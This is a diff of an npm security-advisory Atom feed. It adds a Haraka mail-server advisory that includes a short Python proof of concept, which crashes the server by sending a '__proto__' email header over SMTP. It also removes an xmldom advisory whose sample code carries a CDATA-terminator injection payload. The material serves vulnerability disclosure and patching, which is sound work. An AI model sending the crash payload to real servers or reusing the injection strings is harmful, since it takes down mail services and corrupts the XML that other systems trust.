@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://xlordz.github.io/github-advisory-database-rss/npm.rss</id>
     <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
-    <updated>2026-04-01T22:20:13.183Z</updated>
+    <updated>2026-04-01T23:00:02.945Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
     <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
@@ -11,6 +11,66 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[Haraka] Haraka affected by DoS via `__proto__` email header]]></title>
+        <id>https://github.com/advisories/GHSA-xph3-r2jf-4vp3</id>
+        <link href="https://github.com/advisories/GHSA-xph3-r2jf-4vp3"/>
+        <updated>2026-04-01T22:56:12.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>Sending an email with <code>__proto__:</code> as a header name crashes the Haraka worker process. </p>
+<h3 id="details">Details</h3>
+<p>The header parser at <code>node_modules/haraka-email-message/lib/header.js:215-218</code> stores headers in a plain <code>{}</code> object:</p>
+<pre><code class="language-javascript">_add_header(key, value, method) {
+    this.headers[key] ??= []          // line 216
+    this.headers[key][method](value)  // line 217
+}
+</code></pre>
+<p>When <code>key</code> is <code>__proto__</code>:</p>
+<ol>
+<li><code>this.headers['__proto__']</code> returns <code>Object.prototype</code> (the prototype getter)</li>
+<li><code>Object.prototype</code> is not null/undefined, so <code>??=</code> is skipped</li>
+<li><code>Object.prototype.push(value)</code> throws <code>TypeError: not a function</code></li>
+</ol>
+<p>The TypeError reaches the global <code>uncaughtException</code> handler at <code>haraka.js:26-33</code>, which calls <code>process.exit(1)</code>:</p>
+<pre><code class="language-js">process.on('uncaughtException', (err) =&gt; {
+    if (err.stack) {
+        err.stack.split('\n').forEach((line) =&gt; logger.crit(line))
+    } else {
+        logger.crit(`Caught exception: ${JSON.stringify(err)}`)
+    }
+    logger.dump_and_exit(1)
+})
+</code></pre>
+<h3 id="poc">PoC</h3>
+<pre><code class="language-python">import socket, time
+
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+sock.settimeout(5)
+sock.connect(("127.0.0.1", 2525))
+sock.recv(4096)
+sock.sendall(b"EHLO evil\r\n"); sock.recv(4096)
+sock.sendall(b"MAIL FROM:&lt;x@x.com&gt;\r\n"); sock.recv(4096)
+sock.sendall(b"RCPT TO:&lt;user@haraka.local&gt;\r\n"); sock.recv(4096)
+sock.sendall(b"DATA\r\n"); sock.recv(4096)
+# Crash payload
+sock.sendall(b"From: x@x.com\r\n__proto__: crash\r\n\r\nbody\r\n.\r\n")
+</code></pre>
+<h3 id="impact">Impact</h3>
+<p>In single-process mode (<code>nodes=0</code>), the entire server goes down. In cluster mode, the master restarts the worker, but all sessions are lost.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/haraka/Haraka/security/advisories/GHSA-xph3-r2jf-4vp3">https://github.com/haraka/Haraka/security/advisories/GHSA-xph3-r2jf-4vp3</a></li>
+<li><a href="https://github.com/advisories/GHSA-xph3-r2jf-4vp3">https://github.com/advisories/GHSA-xph3-r2jf-4vp3</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-xph3-r2jf-4vp3</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-04-01T22:56:09.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[dbgate-web] dbgate-web: Stored XSS in applicationIcon leads to potential RCE in Electron due to unsafe renderer configuration]]></title>
         <id>https://github.com/advisories/GHSA-35xm-qvjg-8m42</id>
@@ -1071,119 +1131,5 @@ await fs.remove(file);
         </author>
         <category label="severity" term="HIGH"/>
         <published>2026-04-01T00:23:02.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[@xmldom/xmldom] xmldom: XML injection via unsafe CDATA serialization allows attacker-controlled markup insertion]]></title>
-        <id>https://github.com/advisories/GHSA-wh4c-j3r5-mjhp</id>
-        <link href="https://github.com/advisories/GHSA-wh4c-j3r5-mjhp"/>
-        <updated>2026-04-01T00:19:07.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p><code>@xmldom/xmldom</code> allows attacker-controlled strings containing the CDATA terminator <code>]]&gt;</code> to be inserted into a <code>CDATASection</code> node. During serialization, <code>XMLSerializer</code> emitted the CDATA content verbatim without rejecting or safely splitting the terminator. As a result, data intended to remain text-only became <strong>active XML markup</strong> in the serialized output, enabling XML structure
-injection and downstream business-logic manipulation.</p>
-<p>The sequence <code>]]&gt;</code> is not allowed inside CDATA content and must be rejected or safely handled during serialization. (<a href="https://developer.mozilla.org/">MDN Web Docs</a>)</p>
-<h3 id="attack-surface">Attack surface</h3>
-<p><code>Document.createCDATASection(data)</code> is the most direct entry point, but it is not the only one. The WHATWG DOM spec intentionally does not validate <code>]]&gt;</code> in mutation methods — only <code>createCDATASection</code> carries that guard. The following paths therefore also allow <code>]]&gt;</code> to enter a CDATASection node and reach the serializer:</p>
-<ul>
-<li><code>CharacterData.appendData()</code></li>
-<li><code>CharacterData.replaceData()</code></li>
-<li><code>CharacterData.insertData()</code></li>
-<li>Direct assignment to <code>.data</code></li>
-<li>Direct assignment to <code>.textContent</code></li>
-</ul>
-<p>(Note: assigning to <code>.nodeValue</code> does <strong>not</strong> update <code>.data</code> in this implementation — the serializer reads <code>.data</code> directly — so <code>.nodeValue</code> is not an exploitable path.)</p>
-<h3 id="parse-path">Parse path</h3>
-<p>Parsing XML that contains a CDATA section is <strong>not</strong> affected. The SAX parser's non-greedy <code>CDSect</code> regex stops at the first <code>]]&gt;</code>, so parsed CDATA data never contains the terminator.</p>
-<hr>
-<h2 id="impact">Impact</h2>
-<p>If an application uses <code>xmldom</code> to generate "trusted" XML documents that embed <strong>untrusted user input</strong> inside CDATA (a common pattern in exports, feeds, SOAP/XML integrations, etc.), an attacker can inject additional XML elements/attributes into the generated document.</p>
-<p>This can lead to:</p>
-<ul>
-<li>Integrity violation of generated XML documents.</li>
-<li>Business-logic injection in downstream consumers (e.g., injecting <code>&lt;approved&gt;true&lt;/approved&gt;</code>,  <code>&lt;role&gt;admin&lt;/role&gt;</code>, workflow flags, or other security-relevant elements).</li>
-<li>Unexpected privilege/workflow decisions if downstream logic assumes injected nodes cannot appear.</li>
-</ul>
-<p>This issue does <strong>not</strong> require malformed parsers or browser behavior; it is caused by serialization producing attacker-influenced XML markup.</p>
-<hr>
-<h2 id="root-cause-with-file--line-numbers">Root Cause (with file + line numbers)</h2>
-<p><strong>File:</strong> <code>lib/dom.js</code></p>
-<h3 id="1-no-validation-in-createcdatasection">1. No validation in <code>createCDATASection</code></h3>
-<p><code>createCDATASection: function (data)</code> accepts any string and appends it directly.</p>
-<ul>
-<li><strong>Lines 2216–2221</strong> (0.9.8)</li>
-</ul>
-<h3 id="2-unsafe-cdata-serialization">2. Unsafe CDATA serialization</h3>
-<p>Serializer prints CDATA sections as:</p>
-<pre><code>&lt;![CDATA[ + node.data + ]]&gt;
-</code></pre>
-<p>without handling <code>]]&gt;</code> in the data.</p>
-<ul>
-<li><strong>Lines 2919–2920</strong> (0.9.8)</li>
-</ul>
-<p>Because CDATA content is emitted verbatim, an embedded <code>]]&gt;</code> closes the CDATA section early and the remainder of the attacker-controlled payload is interpreted as markup in the serialized XML.</p>
-<hr>
-<h2 id="proof-of-concept--fix-a-createcdatasection-now-throws">Proof of Concept — Fix A: <code>createCDATASection</code> now throws</h2>
-<p>On patched versions, passing <code>]]&gt;</code> directly to <code>createCDATASection</code> throws <code>InvalidCharacterError</code> instead of silently accepting the payload:</p>
-<pre><code class="language-js">const { DOMImplementation } = require('./lib');
-
-const doc = new DOMImplementation().createDocument(null, 'root', null);
-try {
-  doc.createCDATASection('SAFE]]&gt;&lt;injected attr="pwn"/&gt;');
-  console.log('VULNERABLE — no error thrown');
-} catch (e) {
-  console.log('FIXED — threw:', e.name); // InvalidCharacterError
-}
-</code></pre>
-<p>Expected output on patched versions:</p>
-<pre><code>FIXED — threw: InvalidCharacterError
-</code></pre>
-<hr>
-<h2 id="proof-of-concept--fix-b-mutation-vector-now-safe">Proof of Concept — Fix B: mutation vector now safe</h2>
-<p>On patched versions, injecting <code>]]&gt;</code> via a mutation method (<code>appendData</code>, <code>replaceData</code>, <code>.data =</code>, <code>.textContent =</code>) no longer produces injectable output. The serializer splits the terminator so the result round-trips as safe text:</p>
-<pre><code class="language-js">const { DOMImplementation, XMLSerializer } = require('./lib');
-const { DOMParser } = require('./lib');
-
-const doc = new DOMImplementation().createDocument(null, 'root', null);
-
-// Start with safe data, then mutate to include the terminator
-const cdata = doc.createCDATASection('safe');
-doc.documentElement.appendChild(cdata);
-cdata.appendData(']]&gt;&lt;injected attr="pwn"/&gt;&lt;more&gt;TEXT&lt;/more&gt;&lt;![CDATA[');
-
-const out = new XMLSerializer().serializeToString(doc);
-console.log('Serialized:', out);
-
-const reparsed = new DOMParser().parseFromString(out, 'text/xml');
-const injected = reparsed.getElementsByTagName('injected').length &gt; 0;
-console.log('Injected element found in reparsed doc:', injected);
-// VULNERABLE: true  |  FIXED: false
-</code></pre>
-<p>Expected output on patched versions:</p>
-<pre><code>Serialized: &lt;root&gt;&lt;![CDATA[safe]]]]&gt;&lt;![CDATA[&gt;&lt;injected attr="pwn"/&gt;&lt;more&gt;TEXT&lt;/more&gt;&lt;![CDATA[]]&gt;&lt;/root&gt;
-Injected element found in reparsed doc: false
-</code></pre>
-<hr>
-<h2 id="fix-applied">Fix Applied</h2>
-<p>Both mitigations were implemented:</p>
-<h3 id="option-a--strictspec-aligned-reject--in-createcdatasection">Option A — Strict/spec-aligned: reject <code>]]&gt;</code> in <code>createCDATASection()</code></h3>
-<p><code>Document.createCDATASection(data)</code> now throws <code>InvalidCharacterError</code> (per the <a href="https://dom.spec.whatwg.org/#dom-document-createcdatasection">WHATWG DOM spec</a>) when <code>data</code> contains <code>]]&gt;</code>. This closes the direct entry point.</p>
-<p>Code that previously passed a string containing <code>]]&gt;</code> to <code>createCDATASection</code> and relied on the silent/unsafe behaviour will now receive <code>InvalidCharacterError</code>. Use a mutation method such as <code>appendData</code> if you intentionally need <code>]]&gt;</code> in a CDATASection node's data (the serializer split in Option B will keep the output safe).</p>
-<h3 id="option-b--defensive-serialization-split-the-terminator-during-serialization">Option B — Defensive serialization: split the terminator during serialization</h3>
-<p><code>XMLSerializer</code> now replaces every occurrence of <code>]]&gt;</code> in CDATA section data with the split sequence <code>]]]]&gt;&lt;![CDATA[&gt;</code> before emitting. This closes all mutation-vector paths that Option A alone cannot guard, and means the serialized output is always well-formed XML regardless of how <code>]]&gt;</code> entered the node.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/xmldom/xmldom/security/advisories/GHSA-wh4c-j3r5-mjhp">https://github.com/xmldom/xmldom/security/advisories/GHSA-wh4c-j3r5-mjhp</a></li>
-<li><a href="https://github.com/xmldom/xmldom/commit/2b852e836ab86dbbd6cbaf0537f584dd0b5ac184">https://github.com/xmldom/xmldom/commit/2b852e836ab86dbbd6cbaf0537f584dd0b5ac184</a></li>
-<li><a href="https://github.com/xmldom/xmldom/releases/tag/0.8.12">https://github.com/xmldom/xmldom/releases/tag/0.8.12</a></li>
-<li><a href="https://github.com/xmldom/xmldom/releases/tag/0.9.9">https://github.com/xmldom/xmldom/releases/tag/0.9.9</a></li>
-<li><a href="https://github.com/advisories/GHSA-wh4c-j3r5-mjhp">https://github.com/advisories/GHSA-wh4c-j3r5-mjhp</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-wh4c-j3r5-mjhp</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-04-01T00:19:06.000Z</published>
     </entry>
 </feed>
